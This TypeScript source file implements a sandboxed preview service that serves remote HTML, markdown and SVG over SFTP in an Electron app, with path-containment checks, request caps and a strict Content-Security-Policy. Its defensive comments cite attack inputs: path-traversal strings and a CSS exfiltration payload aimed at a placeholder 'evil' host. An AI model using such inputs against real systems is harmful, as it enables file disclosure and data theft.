import { randomBytes } from 'node:crypto';
import { protocol } from 'electron';
import type { SftpService } from '../sftp/SftpService.js';
import { mimeTypeForExtension, extensionOfPath } from '../attachments/mimeTypes.js';
import {
  PREVIEW_SCHEME,
  containedIn,
  isMarkdownPath,
  parentDirOf,
  previewUrlFor,
  resolveRequestPath,
  tokenOfUrl,
} from './previewPaths.js';
import { markdownToHtml } from './markdownDocument.js';
import { sanitiseAppearance, sanitisePalette, type PreviewStyle } from './previewStyle.js';

/**
 * Serves a remote HTML file — and the assets it asks for — to a sandboxed
 * iframe in the Files tab, over a custom `psview:` scheme.
 *
 * Markdown goes through the same door, converted to HTML on the way out (see
 * markdownDocument.ts, and {@link openMarkdown} below). The class keeps its
 * name because what it serves is still HTML: markdown is an INPUT format that
 * has become HTML by the time any of the reasoning below applies to it.
 * SVG is the third input (see {@link openSvg}) and the one that needs
 * nothing at all done to it: its bytes are already a document Chromium
 * renders, so it is served untouched at its own content type, under the same
 * CSP and sandbox as everything else here.
 *
 * ## Why a scheme and not a blob URL
 *
 * The other viewers in the Files tab (image, audio, PDF) put the file's bytes
 * behind an object URL and point an element at it. That works because those
 * formats are SELF-CONTAINED. An HTML page is not: it is a document plus a
 * graph of things it references by RELATIVE URL, and a blob URL has no path,
 * so `<link href="style.css">` inside a blob-hosted document resolves to
 * nothing at all. Every real page would have rendered unstyled — which is the
 * failure mode that looks like a bad stylesheet rather than like a missing
 * feature, and is the one thing this was not allowed to ship as.
 *
 * A registered scheme gives the frame a real base URL. `psview://<token>/the/
 * remote/path.html` resolves `style.css` to `psview://<token>/the/remote/
 * style.css` by itself, which arrives back here as another request that we
 * answer with another SFTP read. Nothing parses the HTML, nothing rewrites a
 * URL, and it works at any depth and through any indirection — a stylesheet
 * that `@import`s another stylesheet that names a `@font-face` file resolves
 * exactly the same way, which is precisely the class of case that inlining
 * same-directory assets would have missed.
 *
 * ## What this means, and the two things that make it safe
 *
 * It means an untrusted document decides which remote paths this app reads.
 * That is a path-traversal boundary of the kind LocalFileReader's header
 * argues about, and it is answered the same way — by narrowing, not by
 * sanitising:
 *
 *  1. **One directory — for HTML and SVG.** Every request is folded to an
 *     absolute path (previewPaths.normalisePosixPath), checked for containment
 *     in the previewed file's own directory, then re-resolved on the HOST with
 *     `realpath` and checked AGAIN. The first check refuses a path that
 *     spells its way out (`../../etc/passwd`, `%2e%2e/`); the second refuses
 *     one that walks out through a symlink, which no amount of string work
 *     can see. Neither is sufficient alone.
 *
 *     A MARKDOWN preview deliberately widens the first boundary to the whole
 *     host: `root` is minted as `/`, so a link — or an image — naming any path
 *     the SSH account can read is served. That is the feature, not a leak:
 *     markdown documents are cross-referenced by absolute and `../` paths
 *     (`[the design doc](../docs/DESIGN.md)`), and every file the frame can
 *     name is one the user can already open in the Files tab or by clicking it
 *     in terminal output. The folding and the `realpath` re-resolution still
 *     run, unchanged — what they guard (NUL bytes, malformed escapes,
 *     non-canonical spellings) is orthogonal to how wide the root is. The
 *     second containment check passes trivially at that width and is skipped
 *     only as dead code, never as an opened hole: the per-response CSP, the
 *     empty sandbox, and the request/byte budgets below all still apply, and
 *     the worst a hostile markdown file can do stays what it was — DISPLAY
 *     bytes to the user, on a frame with no scripts and no network.
 *  2. **No network, no scripts.** Every response carries a
 *     `Content-Security-Policy` header of its own (see {@link FRAME_CSP}),
 *     and the frame is additionally `sandbox`ed with no tokens by the
 *     renderer. The document cannot execute anything, cannot open a socket,
 *     cannot submit a form and cannot load a single byte from any origin but
 *     this handler.
 *
 * Read those together and the interesting property falls out: the worst a
 * hostile page can do is DISPLAY, to the user, the contents of files the SSH
 * account can read — for an HTML or SVG preview, files in the folder the user
 * just opened; for a markdown preview, anywhere on the host. There is no
 * channel by which it can tell anyone else what it found, because there is no
 * channel at all.
 *
 * ## What is deliberately NOT granted
 *
 * `supportFetchAPI` and `allowServiceWorkers` are off in the scheme's
 * privileges. Nothing needs them: a page with no scripts cannot call `fetch`,
 * and a service worker would be a persistent thing left behind by a document
 * that is supposed to vanish when the tab closes. `bypassCSP` is off for the
 * obvious reason — the whole design rests on the CSP being enforced.
 * `corsEnabled` IS on, and is explained at {@link SCHEME_PRIVILEGES}.
 */

/**
 * What the previewed document IS, before it is served.
 *
 *   html      the bytes on the host are already a document; they are served
 *             untouched, which is what makes `<link href="style.css">` and
 *             every indirection under it resolve on their own.
 *   markdown  the bytes are source for a document, and are converted here.
 *   svg       the bytes are already a document Chromium renders, served
 *             untouched at `image/svg+xml` — exactly the html treatment with
 *             a different content type.
 *
 * The mode is a property of the PREVIEW rather than of each request, and that
 * is the load-bearing part: it is what decides whether a `.md` file the frame
 * asks for next is a document to render or a file to hand over as-is.
 */
export type PreviewMode = 'html' | 'markdown' | 'svg';

/** Everything one live preview knows about itself. */
interface Preview {
  token: string;
  connectionId: string;
  mode: PreviewMode;
  /**
   * Theme values baked into a markdown render, or null for an HTML preview,
   * which is styled entirely by the remote document itself.
   *
   * Baked at mint time rather than read per request because a preview is a
   * SNAPSHOT: the frame has already navigated, nothing in it can be told about
   * a later theme change, and re-styling half the assets of a page that is
   * still loading would be worse than consistent. The renderer re-mints on a
   * theme switch instead, which is one SFTP read of a file the user is looking
   * at, on an event that happens by hand.
   */
  style: PreviewStyle | null;
  /** Directory that bounds every read: the file's own for HTML/SVG, `/` for markdown. */
  root: string;
  /** Symlink-resolved path of the document itself. */
  entry: string;
  /** Requests answered so far, whatever the outcome — the DoS bound. */
  requests: number;
  /** Bytes served so far. */
  bytes: number;
  stats: PreviewStats;
}

/** What the preview toolbar shows, so a missing stylesheet is never silent. */
export interface PreviewStats {
  token: string;
  /** Sub-resources served successfully (the document itself is not counted). */
  loaded: number;
  /** Refused because they lie outside the previewed file's folder. */
  blocked: number;
  /** Asked for and not there, or unreadable. */
  missing: number;
  /** True once a cap was hit and later requests are being dropped wholesale. */
  capped: boolean;
}

/**
 * Per-asset ceiling.
 *
 * Deliberately far below `sftp:readBinary`'s ceiling (`MAX_SFTP_READ_BYTES` in ipc.ts, 128 MiB), because
 * the unit is different: that one bounds ONE file the user asked for by
 * clicking it, this one bounds each of up to {@link MAX_REQUESTS} files that
 * a remote document asked for without anybody clicking anything. 8 MiB clears
 * every stylesheet, script bundle, webfont and hero image a real page carries
 * — a page whose single asset is larger than that is not a page anyone is
 * previewing in a file browser's side pane.
 */
export const MAX_ASSET_BYTES = 8 * 1024 * 1024;

/**
 * Ceiling on requests one preview may make.
 *
 * The cap exists because the request count is under the DOCUMENT's control,
 * not the user's: a page containing ten thousand `<img>` tags is ten thousand
 * SFTP round trips on one connection, which would stall the file browser, the
 * terminal and everything else sharing it. 300 is roughly an order of
 * magnitude above what a heavy documentation page or coverage report actually
 * loads, so hitting it means something pathological rather than something
 * merely large — and when it is hit the preview says so rather than quietly
 * rendering half a page.
 */
export const MAX_REQUESTS = 300;

/** Ceiling on total bytes one preview may pull, for the same reason. */
export const MAX_TOTAL_BYTES = 64 * 1024 * 1024;

/**
 * The Content-Security-Policy every preview response carries.
 *
 * This is the app's real answer to "the HTML is as untrusted as terminal
 * output", so each directive is here on purpose:
 *
 *   default-src 'none'   Nothing loads unless a directive below names it.
 *                        In particular this is what blocks `<img
 *                        src="https://tracker/...">`: rendering a remote
 *                        page must not tell a third party WHICH file on
 *                        which host the user is currently inspecting, which
 *                        is a real leak even when the page is not otherwise
 *                        malicious (analytics beacons and CDN fonts do it by
 *                        accident).
 *   script-src 'none'    See "the scripts decision" below.
 *   style-src psview:    Stylesheets from this handler only...
 *     'unsafe-inline'    ...plus `<style>` blocks and `style=` attributes,
 *                        which essentially every hand-written page uses and
 *                        which cannot be nonce'd without rewriting the
 *                        document. This is the one relaxation here, and it is
 *                        affordable precisely because of the directives
 *                        around it: the classic CSS exfiltration trick is
 *                        `background:url(https://evil/?leak)`, and there is
 *                        no directive on this policy that permits a remote
 *                        URL for anything.
 *   img/font/media-src   Same-scheme assets, plus `data:` for images and
 *                        fonts, which are self-contained and reach no
 *                        network.
 *   connect-src 'none'   Belt to script-src's braces.
 *   form-action 'none'   A page cannot POST what it read anywhere, which
 *                        matters because a form submission is a navigation
 *                        and would otherwise not be covered by connect-src.
 *   base-uri 'none'      A `<base href="https://evil/">` would otherwise
 *                        re-point every relative URL in the document off
 *                        this scheme entirely — the one line that could undo
 *                        the whole policy from inside the document.
 *   frame-src 'none'     No nested frames: an `<iframe src="...">` inside the
 *                        page would be a second document with its own
 *                        chance to get a policy wrong.
 *   sandbox              Same as the iframe attribute the renderer sets, said
 *                        again here so that the guarantee travels with the
 *                        RESPONSE. If anything in this app ever loads a
 *                        psview: URL somewhere other than that one carefully
 *                        written `<iframe sandbox>`, it is still an opaque
 *                        origin with no scripts, no forms and no popups.
 *
 * ## The scripts decision
 *
 * Scripts are refused outright rather than run under `allow-scripts`
 * (the usual "scripts but opaque origin" compromise).
 *
 * What that costs: a page whose content is GENERATED at runtime — a Plotly
 * chart, a client-rendered coverage report, anything Jupyter emits with
 * `require.js` — renders as its static skeleton, which may be nearly empty.
 * That is a real loss and the UI says so out loud whenever the source
 * contains a `<script>` tag, rather than presenting an empty page as the
 * page.
 *
 * What it buys: the preview has NO EXECUTION at all. With `allow-scripts` the
 * accepted threat would be "arbitrary attacker-chosen JavaScript runs inside
 * our renderer process, and we are relying on the opaque origin, the absent
 * preload in subframes, and Chromium's site isolation to contain it" — three
 * mechanisms, any one of which being wrong on some platform or some Electron
 * version is a full compromise of a process that holds SSH sessions. Without
 * it there is nothing to contain: no timers, no DOM mutation, no resource
 * amplification beyond the request caps above, and no dependence on how
 * origins were computed. For a feature whose job is "let me look at an HTML
 * file I found on a server", that trade is not close.
 *
 * If this is ever revisited, note that `allow-scripts` alone is not enough to
 * make it safe — `connect-src 'none'` and the absence of `allow-same-origin`
 * both have to stay, and the request caps become load-bearing rather than
 * merely prudent.
 */
const FRAME_CSP = [
  "default-src 'none'",
  "script-src 'none'",
  `style-src ${PREVIEW_SCHEME}: 'unsafe-inline'`,
  `img-src ${PREVIEW_SCHEME}: data:`,
  `font-src ${PREVIEW_SCHEME}: data:`,
  `media-src ${PREVIEW_SCHEME}:`,
  "connect-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
  "frame-src 'none'",
  "object-src 'none'",
  'sandbox',
].join('; ');

/**
 * The privileges `psview:` is registered with, before app ready.
 *
 *   standard: true    The one that is not optional. A non-standard scheme has
 *                     opaque URL syntax, so relative resolution — the entire
 *                     reason for doing this instead of a blob URL — does not
 *                     happen.
 *   corsEnabled: true Needed for exactly one thing, and it is not obvious:
 *                     the frame is sandboxed WITHOUT `allow-same-origin`, so
 *                     its document sits on an opaque origin and sends
 *                     `Origin: null`. Stylesheets and images do not care —
 *                     they are fetched no-cors — but `@font-face` is
 *                     CORS-checked by the CSS Fonts spec, so a webfont next
 *                     to the page would fail with no visible cause and the
 *                     page would silently fall back to a system font. With
 *                     this on and `Access-Control-Allow-Origin: *` on the
 *                     response, it loads.
 *
 *                     Granting it widens nothing reachable: `*` only helps a
 *                     caller that can name a live token AND is allowed to
 *                     request this scheme, and the app's own CSP
 *                     (src/renderer/index.html) permits `psview:` for
 *                     `frame-src` and nothing else — not connect-src, not
 *                     img-src — so no code in the app document can read one
 *                     of these responses even if it invented the URL.
 *
 * Everything else stays at its default of false. `secure` is not requested:
 * a secure context only unlocks JavaScript APIs, and there is no JavaScript.
 */
const SCHEME_PRIVILEGES = {
  scheme: PREVIEW_SCHEME,
  privileges: { standard: true, corsEnabled: true },
} as const;

/**
 * Register the scheme. MUST be called before `app.whenReady()` — Chromium
 * fixes the set of standard schemes when the network service starts, and a
 * late registration is silently ignored (the frame then loads nothing, with
 * no error, which is the failure this comment exists to prevent someone
 * rediscovering).
 */
export function registerPreviewScheme(): void {
  protocol.registerSchemesAsPrivileged([SCHEME_PRIVILEGES]);
}

export class HtmlPreviewService {
  private readonly previews = new Map<string, Preview>();
  private onStats: ((stats: PreviewStats) => void) | null = null;

  constructor(private readonly sftp: SftpService) {}

  /** Subscribe to per-preview asset counters (main -> renderer). */
  setStatsListener(listener: (stats: PreviewStats) => void): void {
    this.onStats = listener;
  }

  /**
   * Install the request handler on the default session's protocol. Called
   * once, after app ready.
   */
  install(): void {
    protocol.handle(PREVIEW_SCHEME, (request) => this.respond(request));
  }

  /** Mint a preview for one remote HTML file and return the URL to frame. */
  async open(connectionId: string, path: string): Promise<{ token: string; url: string }> {
    return this.mint(connectionId, path, 'html', null);
  }

  /**
   * Mint a preview for one remote markdown file.
   *
   * A separate verb rather than a `mode` argument on {@link open}, because the
   * two do not take the same inputs: a markdown preview needs the app's current
   * palette, which only the renderer knows and which an HTML preview has no use
   * for (a real page brings its own styling, and imposing ours on it would be a
   * lie about what the file looks like).
   *
   * [style] arrives across the IPC bridge and is validated by
   * `sanitisePalette` before it can reach a `<style>` block — see the note on
   * VALUE_ALLOWED in markdownDocument.ts for why main does not simply trust the
   * renderer here.
   */
  async openMarkdown(
    connectionId: string,
    path: string,
    style: { palette?: unknown; appearance?: unknown },
  ): Promise<{ token: string; url: string }> {
    return this.mint(connectionId, path, 'markdown', {
      palette: sanitisePalette(style?.palette),
      appearance: sanitiseAppearance(style?.appearance),
    });
  }

  /**
   * Mint a preview of one remote SVG file.
   *
   * A third verb rather than a reuse of {@link open} because the MODE is not
   * the same: an `.svg` entry document must be served as `image/svg+xml` (a
   * document the frame renders as a drawing), not as `text/html`, and the
   * distinction is per-preview by design. It takes no style for the same
   * reason an HTML preview does not: the file brings its own.
   *
   * Everything that makes an HTML preview safe makes this one safe, because
   * SVG rendered as a DOCUMENT (rather than through `<img>`) can do most of
   * what a page can: a `<script>` inside it would run, an `<image href>` or
   * a stylesheet `@import` would fetch, an `<a>` would navigate. The empty
   * sandbox, the per-response CSP and the containment checks are exactly as
   * load-bearing here as they are for a page.
   */
  async openSvg(connectionId: string, path: string): Promise<{ token: string; url: string }> {
    return this.mint(connectionId, path, 'svg', null);
  }

  /**
   * The shared body of all three verbs: resolve, bound, and hand back a
   * capability.
   *
   * For HTML and SVG the root is resolved with `realpath` HERE rather than
   * being taken as given, because it is the fixed point every later
   * containment check is measured against: if the root itself were a path
   * containing symlinks, a request whose realpath lands inside the physical
   * directory would compare unequal to the logical root and be refused for no
   * reason. Resolving both ends the same way makes the comparison meaningful.
   *
   * A markdown preview takes `/` instead — see the class header's "One
   * directory" note for why the widening is the feature and why it costs
   * nothing — and so needs neither the root realpath nor the entry-in-root
   * check, which is trivially true at that width.
   */
  private async mint(
    connectionId: string,
    path: string,
    mode: PreviewMode,
    style: PreviewStyle | null,
  ): Promise<{ token: string; url: string }> {
    const entry = await this.sftp.realPath(connectionId, path);
    const info = await this.sftp.stat(connectionId, entry);
    if (info.type !== 'file') throw new Error(`Not a regular file: ${path}`);
    let root = '/';
    if (mode !== 'markdown') {
      root = await this.sftp.realPath(connectionId, parentDirOf(entry));
      // A page whose own directory resolved somewhere that does not contain it
      // is not something to reason further about — refuse rather than guess.
      if (!containedIn(root, entry)) throw new Error(`Cannot preview ${path} from ${root}`);
    }

    const token = newToken();
    this.previews.set(token, {
      token,
      connectionId,
      mode,
      style,
      root,
      entry,
      requests: 0,
      bytes: 0,
      stats: { token, loaded: 0, blocked: 0, missing: 0, capped: false },
    });
    return { token, url: previewUrlFor(token, entry) };
  }

  /**
   * Drop a preview. Every later request naming its token 404s, which is what
   * makes closing the file a real revocation rather than a UI change: a frame
   * left alive by a bug cannot keep reading the host.
   */
  release(token: string): void {
    this.previews.delete(token);
  }

  /**
   * Drop every preview belonging to a connection.
   *
   * Wired to `ssh.onCloseConnection` for the same reason the files store
   * clears on disconnect: a token outliving its connection would either fail
   * confusingly or — if a connection id were ever reused — read from a host
   * the preview was never opened against.
   */
  evict(connectionId: string): void {
    for (const [token, preview] of this.previews) {
      if (preview.connectionId === connectionId) this.previews.delete(token);
    }
  }

  /** Handle one `psview:` request. Never throws; every failure is a status. */
  private async respond(request: GlobalRequest): Promise<GlobalResponse> {
    const token = tokenOfUrl(request.url);
    const preview = token ? this.previews.get(token) : undefined;
    // An unknown or released token says nothing about whether the path
    // exists, deliberately — the same reticence LocalFileReader shows when
    // refusing a path that was never picked.
    if (!preview) return refuse(404, 'No such preview');

    // Only GET (and HEAD, which Chromium does not send here). A preview is a
    // read of a file; anything else is a document trying to do something the
    // feature does not have.
    if (request.method !== 'GET' && request.method !== 'HEAD') {
      return refuse(405, 'Method not allowed');
    }

    preview.requests++;
    if (preview.requests > MAX_REQUESTS || preview.bytes > MAX_TOTAL_BYTES) {
      preview.stats.capped = true;
      this.emitStats(preview);
      return refuse(429, 'Preview asset budget exhausted');
    }

    const resolved = resolveRequestPath(request.url, preview.root);
    if (!resolved.ok) {
      // Both malformed and out-of-root count as "blocked" for the user-facing
      // counter: from the reader's point of view they are the same event —
      // the page asked for something the preview would not fetch.
      preview.stats.blocked++;
      this.emitStats(preview);
      return refuse(403, 'Outside the previewed folder');
    }

    // The second half of the traversal defence. `realpath` is the host's own
    // answer to "where does this actually point", which is the only way to
    // see through a symlink — `assets/theme` being a link to `/etc` passes
    // every string check there is and must still be refused. (For a markdown
    // preview, whose root is `/`, this check passes by construction; the
    // realpath still runs, because the canonical path is what gets read.)
    let real: string;
    try {
      real = await this.sftp.realPath(preview.connectionId, resolved.path);
    } catch {
      preview.stats.missing++;
      this.emitStats(preview);
      return refuse(404, 'Not found');
    }
    if (!containedIn(preview.root, real)) {
      preview.stats.blocked++;
      this.emitStats(preview);
      return refuse(403, 'Outside the previewed folder');
    }

    let bytes: Buffer;
    try {
      bytes = await this.sftp.readBinary(preview.connectionId, real, MAX_ASSET_BYTES);
    } catch {
      // Covers not-found, not-a-regular-file and over-the-per-asset-ceiling
      // alike. They are different causes with the same consequence — this
      // asset is not going to be part of the render — and the toolbar's job
      // is to report that consequence, not to triage it.
      preview.stats.missing++;
      this.emitStats(preview);
      return refuse(404, 'Not found');
    }

    preview.bytes += bytes.length;
    if (real !== preview.entry) preview.stats.loaded++;
    this.emitStats(preview);

    // Under a markdown preview, EVERY `.md` the frame navigates to is
    // rendered — not only the entry document.
    //
    // That single rule is what makes `[the design doc](DESIGN.md)` a link that
    // works rather than a link that dead-ends, and it costs nothing extra: the
    // frame resolves the relative href by itself, the request arrives here like
    // any other, and it is already bounded by the same checks as an image
    // would be. Since a markdown preview's root is the host, that means a
    // `docs/` tree browses as a small site wherever its files live — `../`
    // climbs and absolute paths included.
    //
    // What it does NOT do is render markdown found under an HTML or SVG
    // preview: there the user opened a real page (or a drawing), and a `.md`
    // it happens to reference is a file that document asked for, not a
    // document the user chose to read.
    const rendered = renderIfMarkdown(preview, real, bytes);

    return new Response(rendered.bytes, {
      status: 200,
      headers: {
        'Content-Type': rendered.contentType,
        'Content-Security-Policy': FRAME_CSP,
        // Without this, Chromium may sniff an unlabelled response into
        // something more capable than we meant to serve. Everything here is
        // labelled from its extension, so sniffing can only ever disagree
        // with us — and we are the ones who checked.
        'X-Content-Type-Options': 'nosniff',
        // See SCHEME_PRIVILEGES: the frame is on an opaque origin, so a
        // CORS-checked sub-resource (webfonts) sends `Origin: null`.
        'Access-Control-Allow-Origin': '*',
        // No caching, so that saving an edit and re-previewing shows the new
        // bytes rather than the old ones, and so the request counters above
        // measure something real.
        'Cache-Control': 'no-store',
      },
    });
  }

  private emitStats(preview: Preview): void {
    this.onStats?.({ ...preview.stats });
  }
}

/**
 * 16 random bytes, hex.
 *
 * It is a capability, not a name: holding the token is what lets a request
 * reach a preview's root, so it has to be unguessable rather than merely
 * unique. It also has to be a valid URL HOST, which rules out base64 — hex is
 * the longest thing that is trivially host-safe.
 */
function newToken(): string {
  return randomBytes(16).toString('hex');
}

/**
 * A refusal, with a body a human would understand if they ever saw it and a
 * status a browser will not render as content.
 *
 * Refusals carry the same CSP as successes: an error body is still a document
 * as far as the frame is concerned when the navigation itself was refused.
 */
function refuse(status: number, message: string): GlobalResponse {
  return new Response(message, {
    status,
    headers: {
      'Content-Type': 'text/plain; charset=utf-8',
      'Content-Security-Policy': FRAME_CSP,
      'X-Content-Type-Options': 'nosniff',
      'Cache-Control': 'no-store',
    },
  });
}

/**
 * Convert a markdown response into an HTML one, or pass the bytes through.
 *
 * The decode is deliberately NON-fatal: a README with one bad byte in a code
 * fence should still render, with a replacement character where the bad byte
 * was, rather than failing the whole preview — that is the same call the Files
 * tab's text path makes, and for the same reason.
 */
function renderIfMarkdown(
  preview: Preview,
  path: string,
  bytes: Buffer,
): { bytes: Uint8Array; contentType: string } {
  if (preview.mode !== 'markdown' || preview.style == null || !isMarkdownPath(path)) {
    return { bytes: toBody(bytes), contentType: contentTypeFor(path) };
  }
  const source = new TextDecoder('utf-8').decode(bytes);
  const html = markdownToHtml(source, {
    title: path.split('/').pop() ?? 'Preview',
    style: preview.style,
  });
  return {
    bytes: new TextEncoder().encode(html),
    contentType: 'text/html; charset=utf-8',
  };
}

/**
 * Content-Type from the extension alone, and `application/octet-stream` when
 * the extension says nothing.
 *
 * Guessing from CONTENT was considered and rejected: the whole point of
 * `nosniff` above is that we, not Chromium, decide what a byte stream is, and
 * a heuristic that can promote an unknown file to `text/html` hands that
 * decision back to the document that named the file.
 */
function contentTypeFor(path: string): string {
  const mime = mimeTypeForExtension(extensionOfPath(path));
  if (mime == null) return 'application/octet-stream';
  // Text types need a charset or Chromium falls back to the locale encoding,
  // which turns a UTF-8 page into mojibake — the same class of bug the Files
  // tab's classifier exists to avoid, one layer down.
  if (mime.startsWith('text/') || mime === 'image/svg+xml' || mime.endsWith('+xml')) {
    return `${mime}; charset=utf-8`;
  }
  return mime;
}

/** A Buffer view the fetch Response body accepts without copying. */
function toBody(buffer: Buffer): Uint8Array {
  return new Uint8Array(buffer.buffer, buffer.byteOffset, buffer.byteLength);
}
